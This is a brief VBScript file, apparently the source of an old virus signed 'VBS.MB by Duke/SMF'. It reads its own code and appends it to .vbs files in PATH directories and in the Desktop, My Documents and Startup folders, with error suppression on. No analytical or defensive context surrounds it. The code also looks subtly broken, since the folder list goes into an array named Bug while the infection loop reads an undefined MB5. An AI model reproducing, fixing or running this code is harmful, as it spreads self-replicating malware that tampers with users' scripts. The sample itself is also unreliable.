'^
On Error Resume Next
Dim FSO, Vir, SI
Dim Bug(200)
Dim TP
Set WSHShell = Wscript.CreateObject("Wscript.Shell")
Set WshSysEnv = WSHShell.Environment("Process")
MB11 = WshSysEnv("Path")
Set FSO = CreateObject("Scripting.FileSystemObject")
FN = Wscript.ScriptFullName
TP = 1
For x = Len(MB11) To 1 Step -1
  SI = Mid(MB11, x, 1)
  If SI <> ";" Then
    Bug(TP) = SI + Bug(TP)
  ElseIf SI = ";" Then
    Bug(TP) = Bug(TP) + "\"
    TP = TP + 1
  End If
Next
Bug(TP) = Bug(TP) + "\"
Bug(TP + 1) = WSHShell.SpecialFolders("Desktop") + "\"
Bug(TP + 2) = WSHShell.SpecialFolders("MyDocuments") + "\"
Bug(TP + 3) = WSHShell.SpecialFolders("Startup") + "\"
Bug(TP + 4) = Left(FN, InStrRev(FN, "\"))
Set TS = FSO.OpenTextFile(FN, 1)
Buf = TS.ReadAll
TS.Close
Met = Chr(94)
endMet = "'" & Met
For x = Len(Buf) To 1 Step -1
  If Mid(Buf, x, 1) = Met Then
    x = 1
    Vir = endMet + Vir
  ElseIf Mid(Buf, x, 1) <> Met Then
    Vir = Mid(Buf, x, 1) + Vir
  End If
Next
For y = 1 To (TP + 4)
  For Each Target In FSO.GetFolder(MB5(y)).Files
  If UCase(Right(Target.Name, 3)) = "VBS" Then
    Body = ""
    Set TS = FSO.OpenTextFile(MB5(y) & Target.Name, 1)
    Body = TS.ReadAll
    TS.Close
    If mid(Body,len(Body),1) <> "F" Then
      Set TS = FSO.OpenTextFile(MB5(y) & Target.Name, 8)
      TS.Write Vir
      TS.Close
    End If
  End If
  Next
Next
'VBS.MB by Duke/SMF